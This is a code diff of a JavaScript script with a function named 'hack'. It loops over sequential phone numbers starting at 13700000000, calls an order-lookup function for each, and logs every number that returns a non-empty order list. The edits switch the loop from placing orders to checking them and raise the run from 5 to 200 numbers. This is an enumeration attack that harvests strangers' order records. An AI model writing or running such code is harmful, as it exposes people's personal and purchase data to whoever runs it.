@@ -58,7 +58,8 @@ const check = async (tel) => {
     );
 
     const data = await res.json();
-    console.log(data);
+
+    if (data.order_list !== null) console.log(data);
   } catch (error) {
     console.log(error);
   }
@@ -66,10 +67,10 @@ const check = async (tel) => {
 
 const loop = (n) => {
   let x = 1;
-  const startTel = 13700001000;
+  const startTel = 13700000000;
   while (x <= n) {
     const tel = startTel + x;
-    order(tel);
+    check(tel);
     console.log(tel);
     x += 1;
   }
@@ -82,4 +83,4 @@ const hack = (n, timer = true) => {
   }
 };
 
-hack(5, false);
+hack(200, false);
